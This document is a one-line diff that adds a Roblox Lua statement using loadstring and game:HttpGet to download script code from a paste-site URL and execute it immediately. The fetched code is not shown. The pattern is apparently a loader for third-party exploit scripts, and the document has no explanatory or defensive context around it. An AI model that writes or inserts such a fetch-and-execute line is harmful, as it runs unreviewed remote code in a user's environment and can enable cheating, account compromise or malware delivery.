@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luapastes.com/4cagb/raw"))();
